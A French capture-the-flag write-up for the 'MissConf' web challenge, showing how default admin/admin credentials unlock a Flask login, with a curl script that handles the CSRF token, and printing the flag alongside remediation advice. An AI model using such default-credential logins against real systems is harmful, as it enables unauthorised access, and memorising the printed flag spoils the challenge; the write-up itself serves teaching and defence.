# MissConf (2023) — Web

**Flag :** `OPENNC{D0_n0t_M1sc0nf1gur3_Y0uR_4pPZ}`

## Énoncé

« Application développée de manière sécurisée mais **mal configurée**. »
Instance Docker (ctfd-whale), auteur : Yoan AGOSTINI. Formulaire de connexion
Flask-WTF (`/login`) protégé par CSRF.

## Faille — identifiants par défaut

La « mauvaise configuration » est un couple identifiant/mot de passe faible laissé
en place : **`admin` / `admin`**. La réponse le trahit — un login réussi renvoie
un `302` (redirection vers `/`), un échec ré-affiche la page (`200`).

```bash
B=http://legacychalls.hackagou.nc:PORT
page=$(curl -s -c cj "$B/login")
csrf=$(echo "$page" | grep -oP 'name="csrf_token"[^>]*value="\K[^"]+')
curl -s -c cj -b cj -X POST "$B/login" \
     --data-urlencode "csrf_token=$csrf" \
     --data-urlencode "username=admin" --data-urlencode "password=admin"
curl -s -c cj -b cj "$B/" | grep -oE 'OPENNC\{[^}]*\}'
# OPENNC{D0_n0t_M1sc0nf1gur3_Y0uR_4pPZ}
```

La page finale le confirme : *« N'oubliez pas de changer les mots de passe par
défaut ou de ne pas utiliser de couple identifiant/mot de passe faible. »*

## Remédiation

Pas de comptes par défaut ; imposer des mots de passe forts et une politique de
verrouillage.
